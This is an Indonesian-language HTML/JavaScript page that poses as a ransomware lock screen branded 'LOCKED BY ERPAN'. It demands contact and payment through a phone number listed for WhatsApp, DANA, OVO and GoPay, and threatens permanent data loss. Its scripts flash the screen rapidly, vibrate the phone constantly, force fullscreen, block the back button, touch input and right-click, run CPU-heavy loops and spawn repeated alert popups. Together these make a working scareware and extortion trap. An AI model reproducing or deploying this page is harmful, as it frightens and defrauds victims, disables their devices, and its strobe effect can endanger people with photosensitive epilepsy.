<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>‚ö†Ô∏è LOCKED BY ERPAN ‚ö†Ô∏è</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            min-height: 100vh;
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Arial Black', sans-serif;
            overflow: hidden;
        }
        
        .container {
            text-align: center;
            padding: 30px 20px;
            background: #0a0a0a;
            border: 3px solid #ff0000;
            border-radius: 20px;
            box-shadow: 0 0 50px #ff0000;
            width: 95%;
            max-width: 400px;
            animation: shake 0.1s infinite;
            position: relative;
            z-index: 10;
        }
        
        @keyframes shake {
            0% { transform: translate(1px, 1px); }
            25% { transform: translate(-2px, -2px); }
            50% { transform: translate(-3px, 0px); }
            75% { transform: translate(3px, 2px); }
            100% { transform: translate(1px, -1px); }
        }
        
        h1 {
            color: #ff0000;
            font-size: 40px;
            margin-bottom: 15px;
            text-shadow: 0 0 20px #ff0000;
            animation: blink 0.3s infinite;
        }
        
        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.3; }
            100% { opacity: 1; }
        }
        
        .locked {
            color: white;
            font-size: 32px;
            font-weight: bold;
            background: linear-gradient(45deg, #ff0000, #ff6600, #ff0000);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 15px 0;
            animation: gradientMove 2s infinite;
        }
        
        @keyframes gradientMove {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        
        .pin-box {
            background: #1a1a1a;
            border: 2px solid #ff0000;
            border-radius: 15px;
            padding: 15px;
            margin: 20px 0;
        }
        
        .pin-label {
            color: #ffff00;
            font-size: 20px;
            margin-bottom: 10px;
        }
        
        .pin-number {
            color: #00ff00;
            font-size: 45px;
            font-weight: bold;
            letter-spacing: 10px;
            text-shadow: 0 0 20px #00ff00;
            animation: pinPulse 1s infinite;
        }
        
        @keyframes pinPulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .question {
            color: #00ff00;
            font-size: 26px;
            margin: 20px 0;
            animation: questionBlink 0.5s infinite;
        }
        
        @keyframes questionBlink {
            0% { color: #00ff00; }
            50% { color: #ffff00; }
            100% { color: #ff0000; }
        }
        
        .chat-section {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 15px;
            border: 2px dashed #ff0000;
            margin: 15px 0;
        }
        
        .chat-label {
            color: #ff4444;
            font-size: 22px;
            margin-bottom: 10px;
        }
        
        .chat-number {
            color: #44ff44;
            font-size: 28px;
            font-weight: bold;
        }
        
        .payment {
            margin: 20px 0;
        }
        
        .payment-item {
            background: #222;
            color: gold;
            font-size: 20px;
            padding: 12px;
            margin: 8px 0;
            border-radius: 10px;
            border-left: 5px solid #ff0000;
            font-weight: bold;
            animation: slideRight 1s infinite;
        }
        
        @keyframes slideRight {
            0% { transform: translateX(0); }
            50% { transform: translateX(5px); }
            100% { transform: translateX(0); }
        }
        
        .warning {
            color: #ff0000;
            font-size: 18px;
            margin: 15px 0;
            animation: warningFlash 0.2s infinite;
        }
        
        @keyframes warningFlash {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        .timer {
            color: #00ff00;
            font-size: 40px;
            font-family: monospace;
            margin: 15px 0;
            text-shadow: 0 0 20px #00ff00;
        }
        
        button {
            background: #333;
            color: white;
            border: 2px solid #ff0000;
            padding: 15px 40px;
            font-size: 22px;
            border-radius: 10px;
            margin: 10px;
            width: 85%;
            cursor: pointer;
            transition: all 0.3s;
        }
        
        button:hover {
            background: #ff0000;
            transform: scale(1.05);
        }
        
        /* Overlay buat efek flash */
        .flash-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.3);
            pointer-events: none;
            animation: overlayFlash 0.1s infinite;
            z-index: 5;
        }
        
        @keyframes overlayFlash {
            0%, 100% { opacity: 0; }
            50% { opacity: 0.8; }
        }
    </style>
</head>
<body>
    <div class="flash-overlay"></div>
    
    <div class="container" id="mainContainer">
        <h1>üîí RANSOMWARE</h1>
        <div class="locked">LOCKED BY ERPAN</div>
        
        <div class="timer" id="timer">00:30</div>
        
        <!-- PIN YANG DIMINTA: 121234 -->
        <div class="pin-box">
            <div class="pin-label">üîê PIN KUNCI</div>
            <div class="pin-number">121234</div>
        </div>
        
        <div class="question">MAU KEBUKA?</div>
        
        <div class="chat-section">
            <div class="chat-label">üì± CHAT</div>
            <div class="chat-number">6282254440554</div>
        </div>
        
        <div class="payment">
            <div class="payment-item">üí∞ DANA: 6282254440554</div>
            <div class="payment-item">üí≥ OVO: 6282254440554</div>
            <div class="payment-item">üíö GOPAY: 6282254440554</div>
        </div>
        
        <div class="warning">‚ö†Ô∏è JANGAN COBA UNINSTALL! ‚ö†Ô∏è</div>
        <div class="warning">üíÄ DATA LO BAKAL ILANG PERMANEN üíÄ</div>
        
        <button onclick="alert('LU KIRA GAMPANG? CHAT WA: 6282254440554\n\nPIN: 121234')">BUKA KUNCI</button>
    </div>

    <script>
        // TIMER COUNTDOWN
        let timeLeft = 30;
        const timerElement = document.getElementById('timer');
        
        setInterval(() => {
            if (timeLeft >= 0) {
                let minutes = Math.floor(timeLeft / 60);
                let seconds = timeLeft % 60;
                timerElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft < 10) {
                    timerElement.style.color = '#ff0000';
                }
                timeLeft--;
            } else {
                timerElement.textContent = '00:00 - TERKUNCI!';
            }
        }, 1000);
        
        // FLASH EFFECT - KEDIPIN LAMPU HP
        setInterval(() => {
            document.body.style.backgroundColor = '#ffffff';
            document.body.style.transition = 'all 0.05s';
            
            setTimeout(() => {
                document.body.style.backgroundColor = '#000000';
            }, 50);
        }, 150);
        
        // VIBRATE - GETERIN HP
        if (window.navigator && window.navigator.vibrate) {
            setInterval(() => {
                window.navigator.vibrate([300, 200, 500, 200, 800]);
            }, 1500);
        }
        
        // FULLSCREEN LOCK
        function goFullScreen() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            }
        }
        goFullScreen();
        
        // ANTI BACK BUTTON
        history.pushState(null, null, location.href);
        window.onpopstate = function() {
            history.go(1);
            alert('BACK BUTTON DIBLOCK! LU GAK BISA KEMANA-MANA!');
        };
        
        // ANTI SCROLL
        window.addEventListener('scroll', function() {
            window.scrollTo(0, 0);
        });
        
        // LOADING BERAT - BIKIN HP LEMOT
        setInterval(() => {
            for(let i = 0; i < 100000; i++) {
                document.title = 'LOCKED BY ERPAN - ' + i;
            }
        }, 500);
        
        // DISABLE CONTEXT MENU (KLIK KANAN)
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            alert('KLIK KANAN GABISA, BANGSat!');
        });
        
        // DISABLE TOUCH (BIKIN SUSAH DIHP)
        document.addEventListener('touchstart', function(e) {
            e.preventDefault();
        }, false);
        
        // AUTO FOCUS TERUS
        setInterval(() => {
            window.focus();
        }, 100);
        
        // BIKIN BANYAK POPUP PALSU
        setInterval(() => {
            if (Math.random() > 0.7) {
                alert('‚ö†Ô∏è PERINGATAN! HP LO TERKUNCI!\n\nCHAT: 6282254440554\nPIN: 121234');
            }
        }, 5000);
    </script>
</body>
</html>
